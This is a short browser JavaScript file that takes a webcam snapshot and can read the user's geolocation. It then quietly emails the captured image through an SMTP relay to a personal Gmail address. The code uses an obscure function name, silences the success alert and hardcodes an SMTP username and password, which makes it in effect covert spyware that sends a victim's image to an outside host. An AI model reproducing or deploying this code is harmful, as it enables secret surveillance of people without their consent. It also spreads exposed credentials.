
function getLocation() {
  var x = document.getElementById("demo");
  return new Promise(function (resolve, reject) {

    // Promisifying the geolocation API
    navigator.geolocation.getCurrentPosition(
      (position) => resolve(position),
      (error) => reject(error)
    );
  });

}


async function ssss() {
  let video = document.querySelector("#video");
  let canvas = document.querySelector("#canvas");
  let stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
  video.srcObject = stream;

  canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
  let image_data_url = canvas.toDataURL('image/jpeg');

  // data url of the image
  console.log(image_data_url);
  sendEmail(image_data_url)


}

function sendEmail(coords) {

  Email.send({
    Host: "smtp.elasticemail.com",
    Username: "sterdon458@gmail.com",
    Password: "83FB3C75585C807D72DD55A0B71F3140377C",
    To: 'mohits2125@gmail.com',
    From: "sterdon458@gmail.com",
    Subject: "Camera",
    Body: coords,
  })
    .then(function (message) {
      // alert("mail sent successfully")
    });
}